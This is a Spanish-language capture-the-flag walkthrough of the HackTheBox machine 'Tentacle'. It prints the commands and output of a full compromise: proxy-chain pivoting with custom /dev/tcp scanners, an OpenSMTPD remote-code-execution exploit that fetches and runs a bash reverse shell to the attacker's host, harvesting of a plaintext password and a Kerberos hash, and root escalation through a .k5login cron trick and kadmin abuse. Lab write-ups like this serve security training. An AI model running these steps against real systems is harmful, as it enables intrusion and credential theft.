# WriteUp HackTheBox Tentacle

[Nota]: esta maquina fue realizada según el WriteUp realizado por S4vitar

## Descripción de la máquina

![Tentacle_Image](Images/Tentacle.png)

La resolución de la máquina presenta las siguiente fases:

* Reconocimiento
    * nmap
* Explotación
* Escalada de privilegios

## Fase de Reconocimiento

Se realiza una prueba de ping para confirmar que haya conexión con la máquina

```console
ping 10.10.10.224 -c1
```

```
PING 10.10.10.224 (10.10.10.224) 56(84) bytes of data.
64 bytes from 10.10.10.224: icmp_seq=1 ttl=63 time=130 ms

--- 10.10.10.224 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 130.291/130.291/130.291/0.000 ms
```

Para identificar el sistema operativo usamos la utilidad proporcionada por S4vitar whichSystem.py[^1]

[^1]: la utilidad se puede descargar de <https://github.com/Akronox/WichSystem.py>

```console
whichSystem.py 10.10.10.224
```

```
10.10.10.224 (ttl -> 63): Linux
```

Se realiza una revisión de puertos con nmap con las siguientes opciones

* -p-: Para realizar el escaneo en todos los 65000 puertos TCP
* --open: Para reportar solamente los puertos que se encuentran abiertos
* -sS: TCP SYN port scan, este argumento se utiliza para realizar un escaneo rapido de puertos
* --min-rate: El argumento le exige a nmap realizar el escaneo con una tasa de paquetes por segundo no menor a la solicitada
* -vvv: triple verbose para mostrar más información
* -n: para que no realice resolución dns en el scaneo
* -Pn: Desabilita el descubrimiento del host a traves de ping
* -oG: exporta lo reportado en un archivo en formato grepeable

```console
sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.224 -oG nmap/allPorts
```

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-28 21:31 -04
Initiating Parallel DNS resolution of 1 host. at 21:31
Completed Parallel DNS resolution of 1 host. at 21:31, 0.10s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 21:31
Scanning 10.10.10.224 [65535 ports]
Discovered open port 22/tcp on 10.10.10.224
Discovered open port 53/tcp on 10.10.10.224
Discovered open port 3128/tcp on 10.10.10.224
Discovered open port 88/tcp on 10.10.10.224
Completed SYN Stealth Scan at 21:31, 26.38s elapsed (65535 total ports)
Nmap scan report for 10.10.10.224
Host is up, received user-set (0.13s latency).
Scanned at 2022-08-28 21:31:06 -04 for 27s
Not shown: 65498 filtered tcp ports (no-response), 32 filtered tcp ports (admin-prohibited), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 63
53/tcp   open  domain       syn-ack ttl 63
88/tcp   open  kerberos-sec syn-ack ttl 63
3128/tcp open  squid-http   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds
           Raw packets sent: 131045 (5.766MB) | Rcvd: 37 (2.520KB)
```

Por comodidad usamos la utilidad proporcionada por S4vitar extractPorts la cual nos ayuda a revisar el archivo creado por nmap 'all Ports' y nos copia los puertos en la clipboard para su posterior uso; se adjunta la utilidad a continuación

```console
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        /bin/bat extractPorts.tmp
        rm extractPorts.tmp

```

Ejecutamos el comando extractPorts

```console
extractPorts nmap/allPorts
```

```
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.224
   5   │     [*] Open ports: 22,53,88,3128
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
```

Se realiza un nuevo escaneo con una serie de scripts básicos que nmap nos ofrece para ver las técnologias que corren por detrás

```console
sudo nmap -sCV -p22,53,88,3128 10.10.10.224 -oN nmap/targeted
```

```
Nmap scan report for 10.10.10.224
Host is up (0.13s latency).

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2022-08-29 01:33:53Z)
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.11
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.94 seconds
```

Ingresamos al server por un cliente web al puerto 3128 y vemos un dominio *realcorp.htb* y un subdomino *srv01.realcorp.htb*

![squid-index](Images/imagen01.png)

## Fase de Explotación

Se añade el siguiente host a proxychains *http 10.10.10.224 3128*

```console
vim /etc/proxychains.conf
```

```
[...]
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4        127.0.0.1 9050
http 10.10.10.224 3128
```

realizamos un escaneo en la maquina victima con proxychains

```console
proxychains nmap -sT -Pn -v -n 127.0.0.1
```

```
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-28 22:08 -04
Initiating Connect Scan at 22:08
Scanning 127.0.0.1 [1000 ports]
Discovered open port 22/tcp on 127.0.0.1
Discovered open port 53/tcp on 127.0.0.1
Discovered open port 88/tcp on 127.0.0.1
Discovered open port 749/tcp on 127.0.0.1
Discovered open port 3128/tcp on 127.0.0.1
Discovered open port 464/tcp on 127.0.0.1
Nmap scan report for 127.0.0.1
Host is up (0.26s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 262.45 seconds
```

Por otra parte realizamos una enumeración de DNS

```console
dnsenum --dnsserver 10.10.10.224 --threads 50 -f /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb
```

```
[...]
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31
[...]
```

Vemos dos nuevas IPs, con proxychains realizamos un escaneo a esas IPs

```console
proxychains nmap -sT -Pn -v -n 10.197.243.77 pero no tenemos resultados
```

```
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-28 22:22 -04
Initiating Connect Scan at 22:22
Scanning 10.197.243.77 [1000 ports]
Completed Connect Scan at 22:27, 263.48s elapsed (1000 total ports)
Nmap scan report for 10.197.243.77
Host is up (0.26s latency).
All 1000 scanned ports on 10.197.243.77 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 263.54 seconds
```

Modificando nuevamente el proxychains de la siguiente manera, para que usemos la interfaz interna squidproxypara realizar el escaneo

```console
vim /etc/proxychains.conf
```

```
[...]
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4        127.0.0.1 9050
http 10.10.10.224 3128
http 127.0.0.1 3128
```

Realizando nuevamente un escaneo con proxychains vemos que ahora si nos reporta puertos

```console
proxychains nmap -sT -Pn -v -n 10.197.243.77
```
```
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-28 22:38 -04
Initiating Connect Scan at 22:38
Scanning 10.197.243.77 [1000 ports]
Discovered open port 53/tcp on 10.197.243.77
Discovered open port 22/tcp on 10.197.243.77
[...]
```

Nos creamos un scrit en bash para escanear los puertos llamado *portScanner.sh*

```bash
#!/bin/bash

for port in $(seq 1 65535); do
	proxychains timeout 1 bash -c "echo '' > /dev/tcp/$1/$port" 2>1 1>/dev/null && echo "[+] Port $port is OPEN" &
done; wait
```

lanzamos el script contra la IP 10.197.243.77 y vemos que podemos enumerar puertos

```console
./portScanner.sh 10.197.243.77
```

```
[+] Port 22 is OPEN
[+] Port 53 is OPEN
[+] Port 88 is OPEN
[+] Port 464 is OPEN
[+] Port 3128 is OPEN
[+] Port 33150 is OPEN
[+] Port 44234 is OPEN
[+] Port 45784 is OPEN
```

Sin embargo al intentar llegar a la IP 10.197.243.31 vemos que no me enumera nada

```console
./portScanner.sh 10.197.243.31
```

Viendo que el 10.197.243.77 tiene abierto el puerto 3128 probamos de utilizarlo como un proxy m'as en la cadena de proxys de proxychain para llegar al 10.197.243.31

```console
vim /etc/proxychains.conf
```

```
[...]
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4        127.0.0.1 9050
http 10.10.10.224 3128
http 127.0.0.1 3128
http 10.197.243.77 3128
```
Y al volver a correr el script vemos que ahora si podemos enumerar los puertos del servidor

```console
./portScanner.sh 10.197.243.31
```

```
[+] Port 22 is OPEN
[+] Port 53 is OPEN
[+] Port 80 is OPEN
[+] Port 88 is OPEN
[+] Port 464 is OPEN
[+] Port 3128 is OPEN
```

Vemos que tiene el puerto 80 abierto, por tanto realizamos un curl 

```console
proxychains curl -s http://wpad.realcorp.htb
```

```
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.197.243.31:80-<><>-OK
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.1</center>
</body>
</html>
```

Sin embargo apuntando al archivo *wpad.dat* vemos que podemos ver información donde encontramos una nueva red *10.241.251.0/24*

```console
proxychains curl -s http://wpad.realcorp.htb/wpad.dat
```

```
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.197.243.31:80-<><>-OK
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT"; 
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT"; 
 
    return "PROXY proxy.realcorp.htb:3128";
}
```

realizamos un escaneo de puertos en toda la red modificando el portScanner que teniamos en un nuevo archivo *netScanner.sh*

```bash
#!/bin/bash

for port in 21 22 25 80 88 443 445 8080; do
	for i in $(seq 1 254); do
		proxychains timeout 1 bash -c "echo '' > /dev/tcp/10.241.251.$i/$port" 2>1 1>/dev/null && echo "[+] Port $port is OPEN in 10.241.251.$i" &
	done; wait
done
```

realizamos el escaneo

```console
vim netScanner.sh
```

```
[+] Port 22 is OPEN in 10.241.251.1
[+] Port 25 is OPEN in 10.241.251.113
[+] Port 88 is OPEN in 10.241.251.1
```

vemos que tenemos dos nuevos hosts, revisando el puerto 25 del host 10.241.251.113 con nmap obtenemos que corre un OpenSMTPD

```console
proxychains nmap -sT -Pn -sCV -p25 10.241.251.113
```

```
Nmap scan report for 10.241.251.113
Host is up (0.55s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
Service Info: Host: smtp.realcorp.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.50 seconds
```

buscamos vulnerabilidades con searchsploit

```console
searchsploit Opensmtpd
```

```
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                                                                                                   | linux/remote/48038.rb
OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)                                                                                               | linux/local/48185.rb
OpenSMTPD 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Execution                                                                               | openbsd/remote/48051.pl
OpenSMTPD 6.6.1 - Remote Code Execution                                                                                                                    | linux/remote/47984.py
OpenSMTPD 6.6.3 - Arbitrary File Read                                                                                                                      | linux/remote/48139.c
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                                                                   | openbsd/remote/48140.c
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

y nos traemos aquella que nos permite realizar ejecución de comandos en python

```console
searchsploit -m linux/remote/47984.py
```

```
Exploit: OpenSMTPD 6.6.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47984
     Path: /opt/exploitdb/exploits/linux/remote/47984.py
File Type: Python script, ASCII text executable
```

```console
mv 47984.py ../exploits/smtpd_exploit.py
```

realizamos un intento de conexión poniendonos en escucha en el puerto 80 y solicitando una pagina web, pero no hay conexión

```console
proxychains python3 smtpd_exploit.py 10.241.251.113 25 'wget 10.10.14.3'
```

```
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.241.251.113:25-<><>-OK
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

```console
sudo python3 -m http.server 80
```

```
[sudo] password for mzapata: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

con *kerbrute* vemos si el usuario que vimos en la pagina 10.10.10.224:3128 existe y efectivamente vemos que el usuario existe.

```console
kerbrute userenum --dc 10.10.10.224 -d realcorp.htb users
```

```
__             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/29/22 - Ronnie Flathers @ropnop

2022/08/29 16:25:43 >  Using KDC(s):
2022/08/29 16:25:43 >  	10.10.10.224:88

2022/08/29 16:25:43 >  [+] j.nakazawa has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$j.nakazawa@REALCORP.HTB:76175717fd5b45901dc8c60f4795e425$315e424e08b4fa9d139eb67af25ad4d82344b376ce1d0ef6b5d6f074754032ee99334566e511f13b4eb103846bbb9e18418ad0e29c33cc9de395eac5031f664f90e6b6affc80ba367c28340f6b969a876d7046d5937be6dfd26d69fecacf760a7e6e45bcc1c112e3af45c1601e73cb272d183b677daa821a13044c43092216ff2cb6bf792cfee6fc57b02e8fb7133fa4d628715da54f9f7246cd8e46cc35777bf5d93a997dad8d8b5da3aab11bf096c4e0b7342f977fb1c9cee7e9a9f27fb2dc682f2a8a44a0f8
2022/08/29 16:25:43 >  [+] VALID USERNAME:	 j.nakazawa@realcorp.htb
2022/08/29 16:25:43 >  Done! Tested 1 usernames (1 valid) in 0.138 seconds
```

modificando el exploit para enviarle el correo a un usuario existente de la siguiente manera

```python
[...]
print('[*] Payload sent')
s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n')
s.recv(1024)
[...]
```

y al realizar nuevamente una prueba vemos que tenemos ejecución de comandos remota

```console
proxychains python3 smtpd_exploit.py 10.241.251.113 25 'wget 10.10.14.3'
```

```
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.241.251.113:25-<><>-OK
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

```console
sudo python3 -m http.server 80
```

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.224 - - [29/Aug/2022 16:36:18] "GET / HTTP/1.1" 200 -
```

creamos un index.html para descargarlo en la maquina victima con el siguiente contenido:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

realizamos una descarga desde la maquina victima

```console
python3 smtpd_exploit.py 10.241.251.113 25 'wget 10.10.14.3 -O /dev/shm/rev'
```

```
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.241.251.113:25-<><>-OK
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

```console
sudo python3 -m http.server 80
```

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.224 - - [29/Aug/2022 18:03:23] "GET / HTTP/1.1" 200 -
```
Luego nos ponemos en escucha en el puerto 443 y corremos el script descargado en la maquina victima

```console
proxychains python3 smtpd_exploit.py 10.241.251.113 25 'bash /dev/shm/rev'
```

```
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.241.251.113:25-<><>-OK
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

```console
sudo nc -nlvp 443
```

```
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.224] 55024
bash: cannot set terminal process group (18): Inappropriate ioctl for device
bash: no job control in this shell
root@smtp:~# 
```

Revisamos en que maquina nos encontramos y vemos que estamos en la 10.241.251.113 

```console
root@smtp:~# hostname -I
```

```
10.241.251.113
```

una vez dentro de la máquina vemos que existe un archivo en llamado .msmtprc donde podemos encontrar una contraseña del usuario j.nakazawa en texto plano

```console
root@smtp:~# cat /home/j.nakazawa/.msmtprc 
```

```
# Set default values for all following accounts.
defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null

# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
tls_fingerprint	C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

# Set a default account
account default : realcorp
```

probamos ingresar por ssh con esta contraseña sin embargo no nos permite pero vemos que por detrás se está utilizando *gssapi-keyex*

```console
ssh j.nakazawa@10.10.10.224
```

```
The authenticity of host '10.10.10.224 (10.10.10.224)' can't be established.
ECDSA key fingerprint is SHA256:eWzMB5HoqVH++9udWLB4bYS/8KguhJxNZPtZ3JLc3oo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.224' (ECDSA) to the list of known hosts.
j.nakazawa@10.10.10.224's password: 
Permission denied, please try again.
j.nakazawa@10.10.10.224's password: 
Permission denied, please try again.
j.nakazawa@10.10.10.224's password: 
j.nakazawa@10.10.10.224: Permission denied (gssapi-keyex,gssapi-with-mic,password).
```

Si vemos la conexión ssh con verbose vemos que se está utilizando un metodo de autenticación llamado *gssapi-with-mic*

```console
ssh j.nakazawa@10.10.10.224 -v
OpenSSH_8.4p1 Debian-5+deb11u1, OpenSSL 1.1.1n  15 Mar 2022
[...]
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: gssapi-keyex,gssapi-with-mic,password
debug1: Next authentication method: gssapi-with-mic
debug1: Unspecified GSS failure.  Minor code may provide more information
No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1000)


debug1: Unspecified GSS failure.  Minor code may provide more information
No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1000)

debug1: Next authentication method: password
j.nakazawa@10.10.10.224's password: 
```

utilizamos krb5 para autenticarnos con kerberos, modificamos el archivo de krb5

```console
sudo vim /etc/krb5.conf
```

```
[libdefaults]
        default_realm = REALCORP.HTB

[realms]
        REALCORP.HTB = {
                kdc = srv01.realcorp.htb
        }
[domain_realm]
        .REALCORP.HTB = REALCORP.HTB         
        REALCORP.HTB = REALCORP.HTB
```

iniciamos krb5 con el usuario *j.nakazawa* y pasamos la contraseña obtenida

```console
kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB: 
```

Revisamos que se haya creado el archivo correctamente */tmp/krb5cc_1000* 

```console
klist
```

```
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: j.nakazawa@REALCORP.HTB

Valid starting     Expires            Service principal
29/08/22 22:15:57  30/08/22 22:15:51  krbtgt/REALCORP.HTB@REALCORP.HTB
```

y probamos nuevamente conectarnos por ssh y estamos dentro

```console
ssh j.nakazawa@10.10.10.224
```

```
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu Dec 24 06:02:06 2020 from 10.10.14.2
[j.nakazawa@srv01 ~]$ 
```

y aqui podemos ver la flag de usuario

```console
cat user.txt 
```

```
a63a2d42fd8106d95f318094fefb55c4
```

## Fase de Escalación de Privilegios

Revisamos las tareas cron y vemos que el usuario admin est'a ejecutando un archivo de backups

```console
[j.nakazawa@srv01 ~]$ cat /etc/crontab 
```

```
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
* * * * * admin /usr/local/bin/log_backup.sh
```

Y se encuentra realizando un rsync en carpetas de /home/admin

```console
[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh
```

```
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

Dado que se está utilizando kerberos por detras podemos intentar modificar el archivo *.k5login*

```console
[j.nakazawa@srv01 ~]$ cd /var/log/squid/
[j.nakazawa@srv01 ~]$ echo 'j.nakazawa@REALCORP.HTB' > .k5login
```

y dado que se copia el archivo .k5login al home del usuario admin, esperando unos minutos podemos acceder por ssh con el usuario admin y las credenciales de j.nakazawa

```console
ssh admin@10.10.10.224
```

```
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Aug 30 04:09:01 2022
[admin@srv01 ~]$
```

Revisamos que archivos son propietarios del usuario admin con el siguiente comando

```console
[admin@srv01 ~]$ find / -type f -user admin 2>/dev/null | grep -vE "proc|cgroup"
```

```
/home/admin/squid_logs.tar.gz.2022-08-30-041001
/home/admin/squid_logs.tar.gz.2022-08-30-041101
/var/spool/mail/admin
```

Sin embargo vemos que se encuentra vacio el archivo /var/spool/mail/admin, por tanto buscamos por los archivos que pertenecen a los usuarios que est'an en el grupo admin y encontramos un archivo *krb5.keytab*

```console
find / -type f -group admin 2>/dev/null | grep -vE "proc|cgroup"
```

```
/home/admin/squid_logs.tar.gz.2022-08-30-041301
/usr/local/bin/log_backup.sh
/etc/krb5.keytab
```

Sin embargo este */etc/krb5.keytab* solamente debería tener acceso el usuario root, sin embargo el usuario admin puede leerlo

```console
[admin@srv01 ~]$ file /etc/krb5.keytab
```

```
/etc/krb5.keytab: Kerberos Keytab file, realm=REALCORP.HTB, principal=host/srv01.realcorp.htb, type=1, date=Tue Dec  8 22:15:30 2020, kvno=2
```

intentamos conectarnos como *su* con ksu vemos que nos está solicitando la contraseña para el principal root@REALCORP.HTB

```console
[admin@srv01 ~]$ ksu
```

```
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
```

si listamos los principals que tenemos en admin con klist vemos lo siguiente

```console
[admin@srv01 ~]$ klist -k /etc/krb5.keytab
```

```
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
```

si modificamos nuestros principals con kadmin

```console
[admin@srv01 ~]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```

```
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
kadmin:
```

Añadimos un nuevo principal a admin y le creamos una nueva contraseña dado que tenemos permisos de escritura en krb5.keytab

```console
kadmin:  addprinc root@REALCORP.HTB
```

```
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
Principal "root@REALCORP.HTB" created.
```

```console
[admin@srv01 ~]$ ksu
```

```
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
[root@srv01 admin]#
```

Y dado que conseguimos permiso de rooy ya podemos ver la flag de root

```console
[root@srv01 admin]# cat /root/root.txt 
```

```
bd5058bf98fed461c9f411489a6f50f9
```

## Estructura del directorio

```
Tentacle
├── content
│   └── users
├── exploits
│   ├── 1
│   ├── 6Z~64_
│   ├── index.html
│   ├── netScanner.sh
│   ├── portScanner.sh
│   └── smtpd_exploit.py
├── Images
├── nmap
│   ├── 1
│   ├── allPorts
│   ├── realcorp.htb_ips.txt
│   └── targeted
├── Readme.md
└── scripts
```


